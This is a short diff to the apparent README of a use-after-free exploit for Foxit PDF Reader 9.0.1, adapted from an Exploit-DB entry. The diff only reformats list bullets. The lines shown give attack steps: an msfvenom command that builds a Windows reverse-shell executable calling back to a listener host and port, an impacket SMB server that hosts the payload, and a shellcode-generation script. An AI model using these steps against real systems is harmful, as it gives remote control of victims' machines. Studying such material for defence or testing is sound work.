@@ -3,10 +3,10 @@ Foxit PDF Reader 9.0.1.1049 - Pointer Overwrite Use-After-Free (Without Metasplo
 Based on https://www.exploit-db.com/exploits/45269
 
 1. Generate payload, the one i used for testing is:
-  msfvenom -p windows/shell_reverse_tcp LHOST=10.1.1.10 LPORT=443 -f exe > shell.exe
+  - msfvenom -p windows/shell_reverse_tcp LHOST=10.1.1.10 LPORT=443 -f exe > shell.exe
 
 2. Open an SMB server with the payload in it
-  impacket-smbserver sharename /path/to/payload
+  - impacket-smbserver sharename /path/to/payload
 
 3. Generate shellcode with the following script
   ruby generate_shellcode.rb
